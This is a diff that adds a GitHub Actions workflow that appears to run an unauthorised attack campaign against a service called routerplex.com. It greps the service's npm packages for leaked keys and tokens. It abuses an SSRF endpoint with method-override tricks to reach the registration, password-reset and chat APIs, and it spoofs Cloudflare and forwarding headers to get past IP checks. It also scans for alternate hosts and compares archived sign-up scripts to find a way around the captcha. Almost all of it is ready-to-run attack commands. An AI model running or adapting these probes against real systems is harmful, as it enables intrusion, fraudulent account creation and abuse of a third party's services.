@@ -1,0 +1,192 @@
+name: i13072-ssrf-npm
+on:
+  workflow_dispatch:
+
+jobs:
+  ssrf-npm:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Setup
+        run: |
+          echo "=== Runner IP ==="
+          curl -s https://ifconfig.me
+          echo ""
+
+      - name: NPM routerplex CLI - find and analyze
+        run: |
+          echo "=== NPM registry search for routerplex ==="
+          curl -s "https://registry.npmjs.org/-/v1/search?text=routerplex&size=20" | python3 -m json.tool 2>/dev/null | head -100
+          echo ""
+          echo "=== Try different package names ==="
+          for pkg in "routerplex-cli" "routerplex" "@routerplex/cli" "@routerplex/sdk"; do
+            echo "--- Trying $pkg ---"
+            npm view "$pkg" versions 2>/dev/null || echo "Not found: $pkg"
+          done
+          echo ""
+          echo "=== Download whatever we find ==="
+          mkdir -p /tmp/rpx-cli && cd /tmp/rpx-cli
+          # Try the scoped package
+          npm pack @routerplex/cli 2>&1 || true
+          npm pack routerplex-cli 2>&1 || true
+          npm pack routerplex 2>&1 || true
+          ls -la *.tgz 2>/dev/null || echo "No packages downloaded"
+          echo ""
+          # Try npm install instead
+          npm init -y > /dev/null 2>&1
+          npm install @routerplex/cli 2>&1 || npm install routerplex-cli 2>&1 || npm install routerplex 2>&1 || echo "All installs failed"
+          echo ""
+          echo "=== Look at installed files ==="
+          find node_modules/@routerplex node_modules/routerplex-cli node_modules/routerplex 2>/dev/null -type f | sort | head -50
+          echo ""
+          echo "=== Grep for secrets in installed package ==="
+          grep -rn "sk-\|rpx-\|api[_-]key\|secret\|staging\|debug\|fallback\|bypass\|internal\|localhost\|127\.0\.0\.1\|OPENAI\|ANTHROPIC\|AZURE\|hardcoded\|default.*key\|Bearer\|Authorization\|token\|cookie\|session\|login\|register\|auth\|device\|https\?://" node_modules/@routerplex/ node_modules/routerplex*/ 2>/dev/null | head -200
+          echo ""
+          echo "=== package.json of installed ==="
+          cat node_modules/@routerplex/cli/package.json 2>/dev/null || cat node_modules/routerplex-cli/package.json 2>/dev/null || cat node_modules/routerplex/package.json 2>/dev/null || echo "No package.json found"
+          echo ""
+          echo "=== Full source (main file) ==="
+          find node_modules/@routerplex/ node_modules/routerplex*/ -name "*.js" -o -name "*.ts" -o -name "*.mjs" 2>/dev/null | sort | while read f; do
+            echo "========== $f =========="
+            cat "$f" 2>/dev/null | head -500
+            echo ""
+          done
+
+      - name: SSRF method override tests
+        run: |
+          echo "=== SSRF with _method=POST on register ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register?_method=POST&email=test13072@guerrillamail.com&password=Test1234Ab!&first_name=Test&last_name=User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF X-HTTP-Method-Override ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register?X-HTTP-Method-Override=POST&email=test13072@guerrillamail.com&password=Test1234Ab!"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF forgot-password _method=POST (test if method override works) ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/forgot-password?_method=POST&email=postmaster@routerplex.com"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF register with fragment ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register#email=test@test.com&password=Test1234!"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF with method/body/headers in JSON payload ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register","method":"POST","body":"{\"email\":\"t@t.com\",\"password\":\"Test1234!\"}"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/auth/register","headers":{"X-HTTP-Method-Override":"POST","Content-Type":"application/json"}}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+
+      - name: Direct register with CF header spoofing
+        run: |
+          echo "=== Direct POST with CF-Connecting-IP 127.0.0.1 ==="
+          curl -sk "https://routerplex.com/api/auth/register" \
+            -X POST -H "Content-Type: application/json" \
+            -H "CF-Connecting-IP: 127.0.0.1" \
+            -H "X-Forwarded-For: 10.0.0.1" \
+            -H "X-Real-IP: 127.0.0.1" \
+            -d '{"email":"test13072@guerrillamail.com","password":"Test1234Ab!","first_name":"Test","last_name":"User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -30
+          echo ""
+          echo "=== Direct POST with CF-Worker header ==="
+          curl -sk "https://routerplex.com/api/auth/register" \
+            -X POST -H "Content-Type: application/json" \
+            -H "CF-Connecting-IP: 172.68.0.1" \
+            -H "CF-Worker: true" \
+            -d '{"email":"test13072b@guerrillamail.com","password":"Test1234Ab!","first_name":"Test","last_name":"User"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -30
+          echo ""
+          echo "=== SSRF register with forwarded CF headers ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -H "X-Forwarded-For: 127.0.0.1" \
+            -H "CF-Connecting-IP: 127.0.0.1" \
+            -d '{"url":"http://routerplex.com/api/auth/register"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+
+      - name: SSRF playground chat tests
+        run: |
+          echo "=== SSRF to /api/playground/chat (GET) ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/playground/chat"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF to /api/playground variants ==="
+          for path in /api/playground /api/playground/models /api/playground/stream /api/playground/completions /api/playground/v1/chat /api/playground/ws /api/playground/sse; do
+            echo "--- $path ---"
+            curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+              -H "Content-Type: application/json" \
+              -d "{\"url\":\"http://routerplex.com${path}\"}" \
+              -w " HTTP:%{http_code}\n" 2>&1 | tail -3
+          done
+          echo ""
+          echo "=== SSRF ws:// playground ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"ws://routerplex.com/api/playground/chat"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF playground with query params ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://routerplex.com/api/playground/chat?model=jev-latest&message=hello&_method=POST"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF to /v1/chat/completions via SSRF ==="
+          curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+            -H "Content-Type: application/json" \
+            -d '{"url":"http://api.routerplex.com/v1/chat/completions?_method=POST&model=jev-latest&messages=[{\"role\":\"user\",\"content\":\"hi\"}]"}' \
+            -w "\nHTTP_STATUS:%{http_code}\n" 2>&1 | tail -20
+          echo ""
+          echo "=== SSRF via alternative hostnames ==="
+          for host in "webmail.routerplex.com" "api.routerplex.com" "proxy.routerplex.com" "mail.routerplex.com"; do
+            echo "--- $host ---"
+            curl -sk "https://webmail.routerplex.com/api/fetch-ical" \
+              -H "Content-Type: application/json" \
+              -d "{\"url\":\"http://$host/api/auth/register?_method=POST\"}" \
+              -w " HTTP:%{http_code}\n" 2>&1 | tail -3
+          done
+
+      - name: Wayback old sign-up JS bundle analysis
+        run: |
+          echo "=== Download old sign-up page JS bundle from Jul 2026 ==="
+          # The oldest sign-up JS is app/sign-up/page-e0faad71bec5dbff.js from 20260721
+          curl -sL "https://web.archive.org/web/20260721132548/https://routerplex.com/_next/static/chunks/app/sign-up/page-e0faad71bec5dbff.js" > /tmp/old_signup.js 2>/dev/null
+          echo "Old signup JS size: $(wc -c < /tmp/old_signup.js) bytes"
+          echo ""
+          echo "=== Old signup JS content (first 2000 chars) ==="
+          head -c 2000 /tmp/old_signup.js
+          echo ""
+          echo ""
+          echo "=== Grep for register/turnstile/captcha in old JS ==="
+          grep -oi "register\|turnstile\|captcha\|cf-turnstile\|hcaptcha\|recaptcha\|sitekey\|token\|fetch\|POST\|api/auth" /tmp/old_signup.js | sort | uniq -c | sort -rn
+          echo ""
+          echo "=== Current sign-up page JS from Oct 2026 ==="
+          curl -sL "https://web.archive.org/web/20261010112700/https://routerplex.com/_next/static/chunks/app/sign-up/page-cb4046598b35c8f1.js" > /tmp/new_signup.js 2>/dev/null
+          echo "New signup JS size: $(wc -c < /tmp/new_signup.js) bytes"
+          echo ""
+          echo "=== Diff key terms between old and new ==="
+          for term in turnstile captcha register sitekey token fetch; do
+            OLD=$(grep -oc "$term" /tmp/old_signup.js 2>/dev/null || echo 0)
+            NEW=$(grep -oc "$term" /tmp/new_signup.js 2>/dev/null || echo 0)
+            echo "$term: old=$OLD new=$NEW"
+          done
+          echo ""
+          echo "=== Full old signup JS ==="
+          cat /tmp/old_signup.js | head -500
+          echo ""
+          echo "=== Full new signup JS ==="
+          cat /tmp/new_signup.js | head -500
